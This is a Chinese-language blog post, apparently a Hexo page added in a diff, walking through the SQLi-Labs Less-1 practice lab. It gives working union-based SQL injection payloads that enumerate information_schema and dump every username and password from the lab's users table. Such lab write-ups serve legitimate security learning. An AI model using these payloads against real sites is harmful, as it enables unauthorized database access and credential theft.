@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="SQLI-LAB-1准备工具PHPstudy（不要新版）新版phpstudy的MySQL数据库和sqli-lab的数据库无法匹配sqli-lab 正题 所需要用到的SQL语法?id&#x3D;0’order byunion select 第一步我们在拿到一个网站首先需要知道这个网站是否存在sql注入的漏洞，我们可以用?id&#x3D;0’先试一下 ?id&#x3D;0’使用 ?id&#x3D;0’如果数字0出现在报错信息中则为字符型,如">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql-1">
+<meta property="og:url" content="http://example.com/2020/11/24/sql-1/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="SQLI-LAB-1准备工具PHPstudy（不要新版）新版phpstudy的MySQL数据库和sqli-lab的数据库无法匹配sqli-lab 正题 所需要用到的SQL语法?id&#x3D;0’order byunion select 第一步我们在拿到一个网站首先需要知道这个网站是否存在sql注入的漏洞，我们可以用?id&#x3D;0’先试一下 ?id&#x3D;0’使用 ?id&#x3D;0’如果数字0出现在报错信息中则为字符型,如">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2020/11/24/sql-1/picture/sqli-1/1.png">
+<meta property="og:image" content="http://example.com/2020/11/24/sql-1/picture/sqli-1/2.png">
+<meta property="og:image" content="http://example.com/2020/11/24/sql-1/picture/sqli-1/3.png">
+<meta property="og:image" content="http://example.com/2020/11/24/sql-1/picture/sqli-1/4.png">
+<meta property="og:image" content="http://example.com/2020/11/24/sql-1/picture/sqli-1/5.png">
+<meta property="og:image" content="http://example.com/2020/11/24/sql-1/picture/sqli-1/6.png">
+<meta property="og:image" content="http://example.com/2020/11/24/sql-1/picture/sqli-1/7.png">
+<meta property="og:image" content="http://example.com/2020/11/24/sql-1/picture/sqli-1/8.png">
+<meta property="article:published_time" content="2020-11-24T01:38:19.000Z">
+<meta property="article:modified_time" content="2020-11-24T01:38:50.704Z">
+<meta property="article:author" content="ziyuexi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/11/24/sql-1/picture/sqli-1/1.png">
+
+<link rel="canonical" href="http://example.com/2020/11/24/sql-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sql-1 | blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/24/sql-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ziyuexi">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql-1
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-11-24 09:38:19 / 修改时间：09:38:50" itemprop="dateCreated datePublished" datetime="2020-11-24T09:38:19+08:00">2020-11-24</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SQLI-LAB-1"><a href="#SQLI-LAB-1" class="headerlink" title="SQLI-LAB-1"></a>SQLI-LAB-1</h1><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><p>PHPstudy（不要新版）新版phpstudy的MySQL数据库和sqli-lab的数据库无法匹配<br>sqli-lab</p>
+<h2 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h2><p><img src="./picture/sqli-1/1.png" alt="1"></p>
+<h3 id="所需要用到的SQL语法"><a href="#所需要用到的SQL语法" class="headerlink" title="所需要用到的SQL语法"></a>所需要用到的SQL语法</h3><p>?id=0’<br>order by<br>union select</p>
+<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>我们在拿到一个网站首先需要知道这个网站是否存在sql注入的漏洞，我们可以用?id=0’先试一下</p>
+<h4 id="id-0’"><a href="#id-0’" class="headerlink" title="?id=0’"></a>?id=0’</h4><p>使用 ?id=0’如果数字0出现在报错信息中则为字符型,如果0没有出现，则为数字型<br><img src="./picture/sqli-1/2.png" alt="2"><br>这里我们可以得到两个消息，第一个是该网站可以被sql注入第二个则是数据库使用的查询是字符型。</p>
+<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>我们使用order by语句可以来猜列数<br>例如order by 1,5–+<br>这里的–+相当于一个’号因为字符型引号必须对应闭合所以使用–+来让整个语句正确<br><img src="./picture/sqli-1/3.png" alt="3"><br>这里我们可以看见使用1，5太大了因为数据库中并没有5列<br>那么我们给它改小一点<br><img src="./picture/sqli-1/4.png" alt="4"><br>现在的显示就证明确实可能有1-3的行列当然我们也可以再试一下4但是这道题确实只有3列所以不进行尝试了，在正常的sql注入中还是需要准确知道有多少行列。</p>
+<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>我们现在可以使用 union select联合查询的sql语法对数据库中的数据进行查询，来获取数据库中用户信息或者其他我们感兴趣的信息。<br>?id=0’ union select 1,(select group_concat(查询的列名) from 从哪个数据库查询.从哪个表里查询),3 –+<br>例如：<br>?id=0’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+</p>
+<h4 id="为什么要使用-id-0’"><a href="#为什么要使用-id-0’" class="headerlink" title="为什么要使用?id=0’"></a>为什么要使用?id=0’</h4><p>因为我们需要使用一个不存在的id来让我们所需要的信息完整的呈现出来，也可以使用不在1到3之间的数值。</p>
+<h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>这是MYSQL数据库里专门储备各种列表信息的一个数据库只要查询这里基本上可以获取数据库中各种列表的名字和信息。<br><img src="./picture/sqli-1/5.png" alt="5"></p>
+<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>我们可以看见有一个叫做security的列表security的中文是安全的意思所以我们可以推断一下里面可能有我们想要的账户信息<br>所以我们来尝试下进行sql注入来查询security内的所有表名<br>?id=0’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+<br><img src="./picture/sqli-1/6.png" alt="6"><br>这里我们是在第二行进行搜索所以我们想要的信息会呈现在第二行</p>
+<h4 id="where-table-schema-’security’"><a href="#where-table-schema-’security’" class="headerlink" title="where table_schema=’security’"></a>where table_schema=’security’</h4><p>这里的sql语法是将security下的表名给我们呈现出来</p>
+<h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>我们可以看见有users是用户名的意思所以说里面会装着用户的密码和用户名<br>所以我们要用语句来获取所有users当中的列名<br>?id=0’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+<br><img src="./picture/sqli-1/7.png" alt="7"></p>
+<h3 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h3><p>可以看见第一行呈现出的users库下有两个列名<br>username和password顾名思义就是用户名和密码<br>所以我们要使用如下语句查询所有的用户名，密码<br>select group_concat(password) from security.users</p>
+<p>select group_concat(username) from security.users<br>像这样插入<br>?id=0’ union select 1,(select group_concat(password) from security.users),(select group_concat(username) from security.users)–+<br><img src="./picture/sqli-1/8.png" alt="8"><br>我们就得到了所有用户的密码和用户名</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在使用sql注入时一定要先判断该网站是否存在这样的一个sql注入的漏洞，这样就已经成功一半了，进而通过查询mysql特有的库‘information_schema’来获取所有库名通过库名来查询自己想要的信息。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/21/sql/" rel="prev" title="SQL">
+      <i class="fa fa-chevron-left"></i> SQL
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQLI-LAB-1"><span class="nav-number">1.</span> <span class="nav-text">SQLI-LAB-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E5%85%B7"><span class="nav-number">1.1.</span> <span class="nav-text">准备工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">正题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%80%E9%9C%80%E8%A6%81%E7%94%A8%E5%88%B0%E7%9A%84SQL%E8%AF%AD%E6%B3%95"><span class="nav-number">1.2.1.</span> <span class="nav-text">所需要用到的SQL语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="nav-number">1.2.2.</span> <span class="nav-text">第一步</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#id-0%E2%80%99"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">?id&#x3D;0’</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="nav-number">1.2.3.</span> <span class="nav-text">第二步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="nav-number">1.2.4.</span> <span class="nav-text">第三步</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8-id-0%E2%80%99"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">为什么要使用?id&#x3D;0’</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#information-schema"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">information_schema</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5"><span class="nav-number">1.2.5.</span> <span class="nav-text">第四步</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#where-table-schema-%E2%80%99security%E2%80%99"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">where table_schema&#x3D;’security’</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5"><span class="nav-number">1.2.6.</span> <span class="nav-text">第五步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5"><span class="nav-number">1.2.7.</span> <span class="nav-text">第六步</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ziyuexi</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ziyuexi</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
